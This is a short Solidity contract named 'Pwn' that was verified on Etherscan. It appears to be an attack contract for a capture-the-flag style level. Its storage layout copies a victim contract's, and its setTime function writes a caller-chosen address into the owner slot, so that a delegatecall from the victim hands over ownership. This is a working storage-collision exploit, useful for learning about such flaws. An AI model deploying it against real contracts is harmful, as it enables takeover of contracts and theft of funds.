/**
 *Submitted for verification at Etherscan.io on 2023-02-10
*/

contract Pwn {
  // public library contracts 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    function setTime(uint _time) public {
        uint160 time = uint160(_time);
        owner = address(time);
    }

}